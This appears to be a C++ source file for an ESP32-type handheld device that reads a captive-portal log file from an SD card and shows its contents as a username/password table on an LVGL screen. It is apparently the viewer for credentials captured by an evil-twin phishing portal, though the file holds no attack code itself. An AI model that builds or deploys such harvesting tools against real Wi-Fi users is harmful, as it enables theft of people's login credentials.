#include "sd_window.h"
#include "SD_MMC.h"
#include "global_flags.h"
#include "ui.h"
#include "global_flags.h"
#include "pin_config.h"
#include <vector>

static lv_obj_t *container;
void return_function(lv_event_t *e)
{
  if (container == nullptr)
        return;
 void *group_void = lv_obj_get_group(container);

  lv_event_code_t code = lv_event_get_code(e);
  lv_obj_t *ta = lv_event_get_target(e);
  lv_obj_t *kb = (lv_obj_t *)lv_event_get_user_data(e);

  //lv_obj_add_flag(kb, LV_OBJ_FLAG_HIDDEN);
 // lv_group_set_editing((lv_group_t *)lv_obj_get_group(kb), false);
  lv_group_focus_obj(ta);

}
void lv_sd_window(lv_obj_t *parent)
{
  String pswdContent = "";
 // lv_obj_t *container = lv_obj_create(parent);
 // lv_obj_set_size(container, 290, 150);
 // lv_obj_align(container, LV_ALIGN_TOP_MID, 0, 15);
 
  pinMode(PIN_SD_CS, OUTPUT);
  digitalWrite(PIN_SD_CS, 1);
  SD_MMC.setPins(PIN_SD_SCK, PIN_SD_MOSI, PIN_SD_MISO);
  if (!SD_MMC.begin("/sdcard", true))
  {
    return;
  }
  uint8_t cardType = SD_MMC.cardType();

  if (cardType == CARD_NONE)
  {
    return;
  }

  if (cardType == CARD_MMC)
  {
  }
  else if (cardType == CARD_SD)
  {
  }
  else if (cardType == CARD_SDHC)
  {
  }

  File pswd = SD_MMC.open("/captive_portals/logs/logs.txt");
  if (!pswd)
  {
    return;
  }
  else if (pswd.available())
  {
    pswdContent = pswd.readString();
    pswd.close();
  }

  lv_obj_t *table = lv_table_create(parent);
 // lv_obj_set_parent(parent,table);

  container= parent;
  lv_table_set_col_cnt(table, 2); // Defina o número de colunas

  // Adicione cabeçalhos à tabela
  lv_table_set_cell_value(table, 0, 0, "Username");
  lv_table_set_cell_value(table, 0, 1, "Password");

  // Divida as informações em linhas
  int rowIndex = 0; // Comece com a primeira linha
  int start = 0;
  int end;

  for (int i = 0; i < pswdContent.length(); i++)
  {
    char currentChar = pswdContent[i];

    if (currentChar == '\n' || i == pswdContent.length() - 1)
    {
      end = i;
      if (i == pswdContent.length() - 1)
      {
        end = i + 1; // Inclua o último caractere
      }

      String line = pswdContent.substring(start, end);

      // Ignorar linhas em branco
      if (!line.isEmpty())
      {
        int columnIndex = rowIndex % 2;
        int rowIndexInTable = 1 + rowIndex / 2; // Comece com a segunda linha
        lv_table_set_cell_value(table, rowIndexInTable, columnIndex, line.c_str()); // Adicione à tabela
        rowIndex++;
      }

      start = i + 1; // Pule o caractere de nova linha
    }
  }

  /*Set a smaller height to the table. It'll make it scrollable*/
  lv_obj_set_height(table, 150);
  lv_obj_set_width(table, 290);
  lv_obj_center(table);

  lv_obj_add_event_cb(table,return_function,LV_EVENT_CLICKED,NULL);
}


void runSDWindow(lv_obj_t *parent)
{
  lv_sd_window(parent);
}

app_t sd_window = {
  .setup_func_cb = runSDWindow,
  .exit_func_cb = nullptr,
  .user_data = nullptr
};
